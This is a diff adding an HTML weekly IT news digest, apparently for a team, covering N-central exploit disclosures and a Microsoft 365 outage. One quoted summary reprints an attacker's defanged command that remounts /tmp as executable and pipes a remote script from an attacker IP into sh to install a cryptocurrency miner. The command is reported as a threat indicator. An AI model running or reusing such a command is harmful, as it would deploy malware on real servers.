+          <div class="article-summary"><p>N-able on Thursday said it's taking additional precautions in the wake of public disclosure of a new set of flaws tracked as 4EverAble2Shell and Agent2Shell.
+&quot;We are restricting certain N-central features and integrations,&quot; the company said in a Thursday update. &quot;These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers.&quot;
+The following actions have been applied to Hosted environments -
+- Legacy API is turned off by default in the product.
+- Intune integration has been turned off while additional protections are implemented and validated.
+Hosted customers are also being recommended to follow N-able's previous guidance to upgrade Agents and Probes on N-central version 2026.4 HF1 and above, as the update introduces changes in how the Probe and Agent communicate.
+&quot;N-able N-central 2026.4 HF1 updates legacy components of the Agent and Probe, which changes how the two communicate,&quot; it said. &quot;As such, upgrading both Agents and Probes in your N-central server is a MUST to ensure all managed devices are communicating and patched.&quot;
+On-premises customers are being urged to upgrade Agents and Probes and ensure Legacy API access is disabled in the environment, if it has been previously turned on.
+&quot;Our teams are actively assessing the new disclosures, developing additional remediation, and working to safely restore affected functionality,&quot; N-able said. &quot;Protecting our partners and their customers remains our highest priority, and we will continue to take precautionary action where necessary.&quot;
+The development comes as independent security researcher Sean Bales disclosed two new sets of flaws called 4EverAble2Shell and Agent2Shell that work against the latest version of N-central and can allow attackers to execute arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions.
+Multiple threat intelligence reports show that 4EverAble2Shell has moved beyond preliminary probing to active exploitation efforts, with threat actors leveraging it to deploy cryptocurrency miners on vulnerable servers.
+The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9.8), with a separate N-central privilege escalation weakness to obtain root-level access.
+&quot;An unauthenticated exploit chain in N-able N-central, disclosed as 4EverAble2Shell, is reported to allow remote attackers to execute arbitrary operating-system commands with root privileges,&quot; Previdian, which is tracking the flaw as VULN-2026-0009, said.
+&quot;The chain exploits unsafe class instantiation during SOAP fault processing in the bundled Apache Axis component. A crafted request causes an attacker-selected JLine class to process malicious input, resulting in command execution as the nable service account.&quot;
+In an exploit chain detailed by the threat intelligence company, threat actors have been observed attempting to download and execute a shell script (&quot;jup.sh&quot;) from an attacker-controlled server at &quot;157.20.241[.]16,&quot; while sending back diagnostic information and command output to the server.
+Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -
+mount -o remount,exec /tmp 2&gt;/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]
+The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.
+&quot;The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints,&quot; Huntback said. &quot;Treat a hit as a full compromise, not a cleanup job.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a5ef31f54b9')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a3669995331">
+        <div class="article-body">
+          <a href="https://thehackernews.com/2026/11/new-n-central-exploits-work-against.html" target="_blank" rel="noopener noreferrer" class="article-title">New N-central Exploits Work Against Patched Servers, Enable Root RCE and Windows SYSTEM Access</a>
+          <div class="article-meta">thehackernews.com &bull; Nov 12, 2026</div>
+          <div class="article-summary"><p>N-able on Thursday said it's investigating a new public disclosure containing claims of additional vulnerabilities in on-premise versions of N-central running version 2026.4.1 HF2.
+&quot;Based on our initial review, the server issue described depends on a non-default configuration in which the Legacy API is turned on and exposed to the public internet,&quot; N-able said in a new advisory. &quot;Legacy API is turned off by default in the product and is not recommended.&quot;
+The company is urging customers to disable Legacy API immediately, if not already. It also noted that hosted environments are not affected by this issue.
+The incident impacts the following services -
+- N-central On-premise (Americas)
+- N-central On-premise (APAC)
+- N-central On-premise (Europe)
+The development comes days after N-able released 2026.4.1.26 to address a number of security flaws disclosed by independent security researcher Sean Bales earlier this week. The vulnerabilities are collectively tracked under the name Able2Shell.
+The new shortcoming, also revealed by Bales, have been codenamed 4EverAble2Shell and Agent2Shell, adding the proof-of-concept (PoC) exploits successfully work against N-central 2026.4 Hotfix 2 (build 2026.4.1.26), the update N-able released on November 10, 2026, to resolve Able2Shell.
+According to the researcher, 4EverAble2Shell enables unauthenticated remote code execution with root privileges on N-central servers. Agent2Shell, on the other hand, leverages more than 10 zero-day vulnerabilities to run commands on managed Windows agents as NT AUTHORITY\SYSTEM, assuming the attacker knows the target appliance ID.
+Ryan Dewhurst, founder and CEO of Previdian, told The Hacker News that targeted N-central probing has been observed against 4EverAble2Shell within hours following the release of the PoC. The activity has originated from the IP address 157.20.241[.]16. There is no evidence of successful exploitation as of writing.
+In the attack chain observed by the threat intelligence company, threat actors have been observed attempting to achieve initial code execution through a recently disclosed Apache Axis flaw (CVE-2026-90436, CVSS score: 9.8), followed by attempts to escalate privileges to root using 4EverAble2Shell, and then download and execute a shell script from 157.20.241[.]16 using curl.
+Dewhurst said the development marks the first documented instance of exploitation attempts aimed at CVE-2026-90436, patches for which were released on November 6, 2026.
+In a post shared on X, watchTowr also said it's seeing probes for 4EverAble2Shell targeting N-Central builds with the Legacy API enabled.
+(This is a developing story. Please check back for more information.)</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a3669995331')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a962044784a">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMia0FVX3lxTE15TEtlOXZ4UU9OalR0TFBaNlBXTVExVnAzQlJIaDZaQTAyOEEzZS1Hd1RmV0dHMVJGdl9xVGJ5MV9QSDdsSjZ3RGxCYk1NN1AtcTAtQ1BfVzhRd3RvZVdIYVBqbE9iemJ2ZWw0?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft 365 outage: 10 dependencies you might not expect - qz.com</a>
+          <div class="article-meta">qz.com &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft 365 outage: 10 dependencies you might not expect&amp;nbsp;&amp;nbsp;qz.com</p><a href="https://news.google.com/rss/articles/CBMia0FVX3lxTE15TEtlOXZ4UU9OalR0TFBaNlBXTVExVnAzQlJIaDZaQTAyOEEzZS1Hd1RmV0dHMVJGdl9xVGJ5MV9QSDdsSjZ3RGxCYk1NN1AtcTAtQ1BfVzhRd3RvZVdIYVBqbE9iemJ2ZWw0?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a962044784a')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a0f4d5cf53a">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMipAFBVV95cUxPZTVMbVJzc1JBSmxydmwyNlZzTmFMMm8yenRadHhPbFhQSFJfUnFrYVdoX0VfWlFndC1EYzRwaHBTQkVFVjRiMGVQLXYySFZVVEsxYllHSWNFNW55N2VUM3ltbjB5Q3F5elI5TWgwYlA3UkdRb3d0bmNJbzhiSVVwY2N1dHAzUEVaV1I5b0lnVm9zOHIwekdDZ2R5UFd4V0U1NlZvUg?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft introduces Entra security feature that even admins can't disable - Neowin</a>
+          <div class="article-meta">Neowin &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft introduces Entra security feature that even admins can't disable&amp;nbsp;&amp;nbsp;Neowin</p><a href="https://news.google.com/rss/articles/CBMipAFBVV95cUxPZTVMbVJzc1JBSmxydmwyNlZzTmFMMm8yenRadHhPbFhQSFJfUnFrYVdoX0VfWlFndC1EYzRwaHBTQkVFVjRiMGVQLXYySFZVVEsxYllHSWNFNW55N2VUM3ltbjB5Q3F5elI5TWgwYlA3UkdRb3d0bmNJbzhiSVVwY2N1dHAzUEVaV1I5b0lnVm9zOHIwekdDZ2R5UFd4V0U1NlZvUg?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a0f4d5cf53a')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a49f0caf1de">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiZEFVX3lxTFBkb0ttbGlxMjFoWi0zam5BRDVmMWRpRTVXTXFqd2RZSy1rTGxoXzhLUnN1Tm1lbC1Zb2lYYzRVWE1DVDBRQ2RJSm1KR3pFTWZ2ZldvWEVwRVdndHF6Wk1KR0hxTXQ?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Why Microsoft keeps going down: 7 common causes of cloud outages, explained - qz.com</a>
+          <div class="article-meta">qz.com &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Why Microsoft keeps going down: 7 common causes of cloud outages, explained&amp;nbsp;&amp;nbsp;qz.com</p><a href="https://news.google.com/rss/articles/CBMiZEFVX3lxTFBkb0ttbGlxMjFoWi0zam5BRDVmMWRpRTVXTXFqd2RZSy1rTGxoXzhLUnN1Tm1lbC1Zb2lYYzRVWE1DVDBRQ2RJSm1KR3pFTWZ2ZldvWEVwRVdndHF6Wk1KR0hxTXQ?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a49f0caf1de')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+    </section>
+    <section id="m365" class="topic-section">
+      <h2 class="topic-title" style="--c:#D83B01">Microsoft 365 <span class="count">(8)</span></h2>
+      <div class="article-card" data-id="aba3985b8de">
+        <div class="article-body">
+          <a href="https://petri.com/first-ring-daily-25-outages/" target="_blank" rel="noopener noreferrer" class="article-title">First Ring Daily: 25 Outages</a>
+          <div class="article-meta">petri.com &bull; Nov 13, 2026</div>
+          <div class="article-summary"><p>Latest
+Identity Management
+Microsoft 365
+Cloud &amp; Hybrid
+Windows
+PowerShell
+AI
+Webinars
+Topics
+Identity Management
+Active Directory
+Microsoft Entra ID
+Cloud &amp; Hybrid
+Microsoft Azure
+Azure Local (Azure Stack HCI)
+Cloud &amp; Hybrid
+Hybrid Cloud
+Infrastructure &amp; Server
+PowerShell
+Windows Server
+SQL Server
+Windows
+Productivity &amp; Collaboration
+Microsoft 365
+Microsoft Teams
+Microsoft Exchange
+SharePoint
+Power Platform
+Microsoft Copilot
+Windows 365
+Security &amp; Device Management
+Endpoint Protection
+Endpoint Management
+Microsoft Sentinel
+Security
+Information Security
+Ransomware
+More from Petri
+Webinars
+Podcasts
+Learning Center
+Advertising
+Media Kit
+Contact Us
+About
+Subscribe to Petri.com
+Search
+Blog
+Microsoft 365
+Post
+Microsoft 365
+Nov 13, 2026
+First Ring Daily: 25 Outages
+By
+Laurent Giret
+on Nov 13, 2026
+Related Articles
+See all
+Microsoft 365
+What Is Office Metadata and How to Remove It from Microsoft Office Documents
+Michael Reinders
+Aug 18, 2026
+Backup &amp; Storage
+Microsoft 365
+Best Microsoft 365 Backup Solutions for Recovery, Resilience, and Compliance
+Russell Smith
+Last Updated:
+Aug 07, 2026
+Microsoft 365
+Artificial Intelligence
+Microsoft Copilot
+Microsoft 365 Copilot License: Pricing, Requirements, and What’s Actually Included
+Russell Smith
+Jun 16, 2026
+Microsoft 365
+Artificial Intelligence
+Microsoft Copilot
+One Copilot to Rule Them All? Microsoft’s Unified AI Platform for Work and Life
+Russell Smith
+Jun 11, 2026
+Microsoft 365
+Microsoft Without a Rulebook
+Why Microsoft 365’s Baseline Security Mode Is a Migration Target, Not a Flip Switch
+Amy Babinchak
+Last Updated:
+Jul 09, 2026
+Microsoft 365
+Exchange Online
+Exchange Migration Services and Tools: The Real Cost IT Directors Need to Budget For
+Marc-André Hallé
+Last Updated:
+Jul 01, 2026</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('aba3985b8de')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a8fa7a17a63">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-deploys-patch-stabilize-microsoft-365-outage/" target="_blank" rel="noopener noreferrer" class="article-title">[Updated] Microsoft Deploys Configuration Patch to Stabilize Global Microsoft 365 Outage</a>
+          <div class="article-meta">petri.com &bull; Nov 13, 2026</div>
+          <div class="article-summary"><p>Microsoft is gradually stabilizing its cloud infrastructure after an internal capacity cascade knocked carious Microsoft 365 services offline worldwide, forcing hospitals, emergency services, and enterprises onto manual backups while IT admins await full service restoration and audit delayed mail and security alerts.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a8fa7a17a63')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="ace273748d7">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-oauth-exchange-mailbox-migrations/" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Adds OAuth Support to Exchange Online Mailbox Migrations</a>
+          <div class="article-meta">petri.com &bull; Nov 12, 2026</div>
+          <div class="article-summary"><p>Microsoft has added OAuth support to Exchange Online mailbox migrations, giving organizations an alternative to Basic Authentication for moving mailboxes between on-premises Exchange and Microsoft 365. The change could help reduce reliance on privileged credentials during migration projects, though adoption remains optional for now.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('ace273748d7')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a565a16e56f">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiwAFBVV95cUxQRzBtTUNkUXFmQl82dFZSOEptbGdmdTVLT0sxMFY2UkhtWmpJVkMyWTNwaGxhSmpFellYSXlZQ0dfeFVDQzBaYy1zWldCT3VSRWctQmNrLVB0a0FoNk1CVUZiWmdlUlBYcjNLNW5oaG9YRWVCNUhiZi1UV2s3djRkb0NpY3pEYktrTXhNeWh0YkxSMUprbDBDcFR1d1VGRFdPSnpxMnd2SHBuRGFtM3lFalR1UGFHSUt6NUdNREZCTVbSAcYBQVVfeXFMUFNibHp2VFJwRmxZYzJEdHFDYVo5QTExVTFLTmpyZEtFYTFEMHhvTmI2TEhQOUpxdTdIVHg1LUlsZjItVjdrelVWTmsyaElJejV1dFVNRy0xSGJTaGNYbmlwNnlTSDI0Nm0tazR2Rk9WM1FMMWs5R3lELUdMT2ItX1J5MmxTUTZSbHQzc1hVODVYMGQtbjh5ZWgzRVVEYkFaaTd5X1huZHZkVDlrRm1vcjVFRllrZzFaZ2VPQUE2eDJXTDJvV3l3?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft 365 hit by multi-region connectivity issues amid elevated infrastructure load - Fox Business</a>
+          <div class="article-meta">Fox Business &bull; Nov 12, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft 365 hit by multi-region connectivity issues amid elevated infrastructure load&amp;nbsp;&amp;nbsp;Fox Business</p><a href="https://news.google.com/rss/articles/CBMiwAFBVV95cUxQRzBtTUNkUXFmQl82dFZSOEptbGdmdTVLT0sxMFY2UkhtWmpJVkMyWTNwaGxhSmpFellYSXlZQ0dfeFVDQzBaYy1zWldCT3VSRWctQmNrLVB0a0FoNk1CVUZiWmdlUlBYcjNLNW5oaG9YRWVCNUhiZi1UV2s3djRkb0NpY3pEYktrTXhNeWh0YkxSMUprbDBDcFR1d1VGRFdPSnpxMnd2SHBuRGFtM3lFalR1UGFHSUt6NUdNREZCTVbSAcYBQVVfeXFMUFNibHp2VFJwRmxZYzJEdHFDYVo5QTExVTFLTmpyZEtFYTFEMHhvTmI2TEhQOUpxdTdIVHg1LUlsZjItVjdrelVWTmsyaElJejV1dFVNRy0xSGJTaGNYbmlwNnlTSDI0Nm0tazR2Rk9WM1FMMWs5R3lELUdMT2ItX1J5MmxTUTZSbHQzc1hVODVYMGQtbjh5ZWgzRVVEYkFaaTd5X1huZHZkVDlrRm1vcjVFRllrZzFaZ2VPQUE2eDJXTDJvV3l3?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a565a16e56f')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="acee1671ba8">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiogFBVV95cUxORzFTSUdWUkpoWUk1Z2FULTd2ZmRRUmVINTBTZjNUVEdtT3BBNUxxck1ZcXFQenhma1F5RG5BZXIwVkItZWhaWGl2dHlzVWRTZkIza0Y3QWVyd1hlSUo0dUo0XzRzOTFiZnJYelhtakN2R1VJOU5oUzY2MHVGSko3MTF1ZXE2T0tRY1lCMWc5M1ZBeFpfZ0ZVbV8waldfVlByNlE?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">A global Microsoft 365 outage has hit millions – what happened and when will it be fixed? - The Guardian</a>
+          <div class="article-meta">The Guardian &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>A global Microsoft 365 outage has hit millions – what happened and when will it be fixed?&amp;nbsp;&amp;nbsp;The Guardian</p><a href="https://news.google.com/rss/articles/CBMiogFBVV95cUxORzFTSUdWUkpoWUk1Z2FULTd2ZmRRUmVINTBTZjNUVEdtT3BBNUxxck1ZcXFQenhma1F5RG5BZXIwVkItZWhaWGl2dHlzVWRTZkIza0Y3QWVyd1hlSUo0dUo0XzRzOTFiZnJYelhtakN2R1VJOU5oUzY2MHVGSko3MTF1ZXE2T0tRY1lCMWc5M1ZBeFpfZ0ZVbV8waldfVlByNlE?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('acee1671ba8')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a587b5b3246">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiowFBVV95cUxNOUtUVE82eXE0TG1YNjJOWmRRcmNhU3pZeUNZTFItRVFySUJLNVFzaXRwWkc4T1pLRjUySVYwQzYzV2VmT1M1N1VZa1d1MTJBaF83QWZZOTBKWllZb095UHYzUW5fd3dzRElwNXl0a0tLdFF0ZU5keVNfcFJzOHFLU0NldDhrV2FkSGdaazRPb2hyXzF4LUJERlJGZHVUbnViam1F?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Is Microsoft down? Users report issues with Outlook, 365 on Thursday - USA Today</a>
+          <div class="article-meta">USA Today &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Is Microsoft down? Users report issues with Outlook, 365 on Thursday&amp;nbsp;&amp;nbsp;USA Today</p><a href="https://news.google.com/rss/articles/CBMiowFBVV95cUxNOUtUVE82eXE0TG1YNjJOWmRRcmNhU3pZeUNZTFItRVFySUJLNVFzaXRwWkc4T1pLRjUySVYwQzYzV2VmT1M1N1VZa1d1MTJBaF83QWZZOTBKWllZb095UHYzUW5fd3dzRElwNXl0a0tLdFF0ZU5keVNfcFJzOHFLU0NldDhrV2FkSGdaazRPb2hyXzF4LUJERlJGZHVUbnViam1F?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a587b5b3246')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a0858a1deac">
+        <div class="article-body">
+          <a href="https://petri.com/microsoft-deploys-patch-stabilize-microsoft-365-outage/" target="_blank" rel="noopener noreferrer" class="article-title">[Updated] Microsoft Deploys Configuration Patch to Stabilize Global Microsoft 365 Outage - Petri IT Knowledgebase</a>
+          <div class="article-meta">Petri IT Knowledgebase &bull; Nov 13, 2026</div>
+          <div class="article-summary"><p>Microsoft is gradually stabilizing its cloud infrastructure after an internal capacity cascade knocked carious Microsoft 365 services offline worldwide, forcing hospitals, emergency services, and enterprises onto manual backups while IT admins await full service restoration and audit delayed mail and security alerts.</p></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a0858a1deac')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+      <div class="article-card" data-id="a30a3ef41be">
+        <div class="article-body">
+          <a href="https://news.google.com/rss/articles/CBMiggFBVV95cUxORXpmMkkxQ09tQVliNDBnbmxMZ3ZhOW9BalhaU0ZLWlpnek54X1RCSW5TdHFUYmticDdfX0x3a3NGc08tZk0wWmFSWU5vaDVBc0RBRFpKdW5mX192Q2F3emJhUHJXVkxSTEhCakZVdHpzSXRlSkpXMXl3VUdXdXF6T3hR?oc=5" target="_blank" rel="noopener noreferrer" class="article-title">Microsoft Outlook Goes Down, Paralyzing Business Communication - Deadline</a>
+          <div class="article-meta">Deadline &bull; Nov 13, 2026</div>
+          <div class="article-summary snippet"><p>Microsoft Outlook Goes Down, Paralyzing Business Communication&amp;nbsp;&amp;nbsp;Deadline</p><a href="https://news.google.com/rss/articles/CBMiggFBVV95cUxORXpmMkkxQ09tQVliNDBnbmxMZ3ZhOW9BalhaU0ZLWlpnek54X1RCSW5TdHFUYmticDdfX0x3a3NGc08tZk0wWmFSWU5vaDVBc0RBRFpKdW5mX192Q2F3emJhUHJXVkxSTEhCakZVdHpzSXRlSkpXMXl3VUdXdXF6T3hR?oc=5" target="_blank" rel="noopener noreferrer" class="read-more">Read full article &rarr;</a></div>
+        </div>
+        <button class="hide-btn" onclick="toggleArticle('a30a3ef41be')" title="Collapse for colleagues">
+          <span class="lbl-hide">&#128065; Hide</span>
+          <span class="lbl-show">&#128064; Show</span>
+        </button>
+      </div>
+    </section>
+    <section id="iru" class="topic-section">
+      <h2 class="topic-title" style="--c:#7C3AED">Iru MDM (formerly Kandji) </h2>
+      <p class="no-news">No articles found this week.</p>
+    </section>
+    <section id="cato" class="topic-section">
+      <h2 class="topic-title" style="--c:#FF6B35">Cato Networks </h2>
+      <p class="no-news">No articles found this week.</p>
+    </section>
+</main>
+
+<footer>
+  Generated every Sunday &mdash; Topics: Windows &bull; Azure &bull; SharePoint &bull; Intune &bull; Entra ID &bull; Microsoft 365 &bull; Iru MDM (formerly Kandji) &bull; Cato Networks
+</footer>
+
+<script>
+const KEY = 'it-news-hidden-v1';
+function getHidden() {
+  try { return new Set(JSON.parse(localStorage.getItem(KEY) || '[]')); }
+  catch { return new Set(); }
+}
+function saveHidden(s) { localStorage.setItem(KEY, JSON.stringify([...s])); }
+function toggleArticle(id) {
+  const h = getHidden();
+  h.has(id) ? h.delete(id) : h.add(id);
+  saveHidden(h); applyHidden(h);
+}
+function applyHidden(h) {
+  h = h || getHidden();
+  document.querySelectorAll('.article-card[data-id]').forEach(c => {
+    c.classList.toggle('is-hidden', h.has(c.dataset.id));
+  });
+}
+let revealing = false;
+function toggleReveal() {
+  revealing = !revealing;
+  document.body.classList.toggle('reveal-hidden', revealing);
+  document.getElementById('reveal-btn').textContent = revealing ? 'Hide hidden' : 'Show hidden';
+}
+fetch('weeks.json').then(r => r.json()).then(weeks => {
+  const sel = document.getElementById('week-sel');
+  weeks.forEach(w => {
+    const o = document.createElement('option');
+    o.value = w.file; o.textContent = w.label;
+    if (w.current) o.selected = true;
+    sel.appendChild(o);
+  });
+}).catch(() => {});
+applyHidden();
+</script>
+</body>
+</html>
